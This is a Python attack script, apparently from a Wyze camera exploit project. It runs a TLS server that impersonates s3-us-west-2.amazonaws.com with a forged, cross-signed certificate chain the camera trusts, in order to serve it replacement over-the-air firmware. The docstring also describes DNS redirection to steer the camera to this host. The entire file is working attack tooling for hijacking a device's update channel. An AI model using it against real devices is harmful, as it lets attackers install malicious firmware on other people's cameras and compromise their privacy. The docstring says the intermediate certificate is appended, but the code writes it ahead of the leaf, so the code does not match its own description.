#!/usr/bin/env python3
"""Serve the OTA payload over TLS with a forged chain the camera trusts.

Bind :443 (or --port), present deliverables/certs/emudhra/{leaf.pem,leaf.key} with the cross-signed
intermediate appended, and serve --dir. Prints the chain it will send so a failure is diagnosable.

The camera reaches this by name, so something must resolve the name to this host: either a DNS
answer for the SAN host (see docs/exploit/wyze-forged-chain.md) or the delta URL pointed at a name
that already resolves here.

  wyze_forge_serve.py --dir /tmp/fwserve --port 443 --sni s3-us-west-2.amazonaws.com
"""
import argparse, http.server, os, ssl, sys

HERE = os.path.dirname(os.path.abspath(__file__))
CERTDIR = os.path.join(HERE, "..", "certs", "emudhra")


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--dir", default="/tmp/fwserve")
    ap.add_argument("--port", type=int, default=443)
    ap.add_argument("--cert", default=os.path.join(CERTDIR, "leaf.pem"))
    ap.add_argument("--key", default=os.path.join(CERTDIR, "leaf.key"))
    ap.add_argument("--intermediate", default=os.path.join(CERTDIR, "ev-ca-aaa-cross.pem"))
    ap.add_argument("--sni", default="s3-us-west-2.amazonaws.com", help="expected SNI, for the log")
    a = ap.parse_args()

    chain = os.path.join(CERTDIR, "serve.pem")
    with open(chain, "wb") as out:
        out.write(open(a.intermediate, "rb").read())
        out.write(open(a.cert, "rb").read())
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(chain, a.key)

    handler = lambda *x, **kw: http.server.SimpleHTTPRequestHandler(*x, directory=a.dir, **kw)
    srv = http.server.HTTPServer(("0.0.0.0", a.port), handler)
    srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    print(f"serving {a.dir} on :{a.port}, expecting SNI {a.sni}, chain {chain}", flush=True)
    srv.serve_forever()
    return 0


if __name__ == "__main__":
    sys.exit(main())
